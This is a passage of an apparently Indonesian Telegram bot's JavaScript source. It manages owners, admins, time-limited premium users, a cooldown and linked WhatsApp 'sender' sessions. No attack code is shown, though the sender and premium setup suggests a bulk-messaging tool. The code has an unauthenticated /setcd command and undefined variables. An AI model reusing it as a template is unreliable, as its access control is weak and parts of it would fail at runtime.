        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 123456789.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 123456789.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});


bot.onText(/\/addowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const newOwnerId = match[1].trim();

  try {
    const configPath = "./config.js";
    const configContent = fs.readFileSync(configPath, "utf8");

    if (config.OWNER_ID.includes(newOwnerId)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`
╭─────────────────
│    GAGAL MENAMBAHKAN    
│────────────────
│ User ${newOwnerId} sudah
│ terdaftar sebagai owner
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID.push(newOwnerId);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `\`\`\`
╭─────────────────
│    BERHASIL MENAMBAHKAN    
│────────────────
│ ID: ${newOwnerId}
│ Status: Owner Bot
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error adding owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menambahkan owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/delowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const ownerIdToRemove = match[1].trim();

  try {
    const configPath = "./config.js";

    if (!config.OWNER_ID.includes(ownerIdToRemove)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`
╭─────────────────
│    GAGAL MENGHAPUS    
│────────────────
│ User ${ownerIdToRemove} tidak
│ terdaftar sebagai owner
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID = config.OWNER_ID.filter((id) => id !== ownerIdToRemove);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `\`\`\`
╭─────────────────
│    BERHASIL MENGHAPUS    
│────────────────
│ ID: ${ownerIdToRemove}
│ Status: User Biasa
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error removing owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menghapus owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender"
      );
    }

    let botList = 
  "```" + "\n" +
  "╭━━━⭓「 𝐋𝐢𝐒𝐓 ☇ °𝐁𝐎𝐓 」\n" +
  "║\n" +
  "┃\n";

let index = 1;

for (const [botNumber, sock] of sessions.entries()) {
  const status = sock.user ? "🟢" : "🔴";
  botList += `║ ◇ 𝐁𝐎𝐓 ${index} : ${botNumber}\n`;
  botList += `┃ ◇ 𝐒𝐓𝐀𝐓𝐔𝐒 : ${status}\n`;
  botList += "║\n";
  index++;
}
botList += `┃ ◇ 𝐓𝐎𝐓𝐀𝐋𝐒 : ${sessions.size}\n`;
botList += "╰━━━━━━━━━━━━━━━━━━⭓\n";
botList += "```";


    await bot.sendMessage(chatId, botList, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error in listbot:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengambil daftar bot. Silakan coba lagi."
    );
  }
});

bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error(`bot ${botNum}:`, error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

const moment = require("moment");

bot.onText(/\/setcd (\d+[smh])/, (msg, match) => {
  const chatId = msg.chat.id;
  const response = setCooldown(match[1]);

  bot.sendMessage(chatId, response);
});

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d."
    );
  }

  const args = match[1].split(" ");
  if (args.length < 2) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d."
    );
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ""));
  const duration = args[1];

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d."
    );
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d."
    );
  }

  const now = moment();
  const expirationDate = moment().add(
    parseInt(duration),
    duration.slice(-1) === "d"
      ? "days"
      : duration.slice(-1) === "h"
      ? "hours"
      : "minutes"
  );

  if (!premiumUsers.find((user) => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(
      `${senderId} added ${userId} to premium until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}`
    );
    bot.sendMessage(
      chatId,
      `✅ User ${userId} has been added to the premium list until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  } else {
    const existingUser = premiumUsers.find((user) => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
    savePremiumUsers();
    bot.sendMessage(
      chatId,
      `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});


bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - P R E M \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format("YYYY-MM-DD HH:mm:ss");
    message += `${index + 1}. ID: \`${
      user.id
    }\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/cekidch (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const link = match[1];

  let result = await getWhatsAppChannelInfo(link);

  if (result.error) {
    bot.sendMessage(chatId, `⚠️ ${result.error}`);
  } else {
    let teks = `
📢 *Informasi Channel WhatsApp*
🔹 *ID:* ${result.id}
🔹 *Nama:* ${result.name}
🔹 *Total Pengikut:* ${result.subscribers}
🔹 *Status:* ${result.status}
🔹 *Verified:* ${result.verified}
        `;
    bot.sendMessage(chatId, teks);
  }
});

bot.onText(/\/delbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  let statusMessage = await bot.sendMessage(
    chatId,
`
\`\`\`╭─────────────────
│    𝙼𝙴𝙽𝙶𝙷𝙰𝙿𝚄𝚂 𝙱𝙾𝚃    
│────────────────
│ Bot: ${botNumber}
│ Status: Memproses...
╰─────────────────\`\`\`
`,
    { parse_mode: "Markdown" }
  );

  try {
    const sock = sessions.get(botNumber);
    if (sock) {
      sock.logout();
      sessions.delete(botNumber);

      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }

      if (fs.existsSync(SESSIONS_FILE)) {
        const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        const updatedNumbers = activeNumbers.filter((num) => num !== botNumber);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
      }

      await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    } else {
      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });

        if (fs.existsSync(SESSIONS_FILE)) {
          const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
          const updatedNumbers = activeNumbers.filter(
            (num) => num !== botNumber
          );
          fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
        }

        await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      } else {
        await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁    
│────────────────
│ Bot: ${botNumber}
│ Status: Bot tidak ditemukan!
╰─────────────────\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      }
    }
  } catch (error) {
    console.error("Error deleting bot:", error);
    await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁  
│────────────────
│ Bot: ${botNumber}
│ Status: ${error.message}
╰─────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }
});
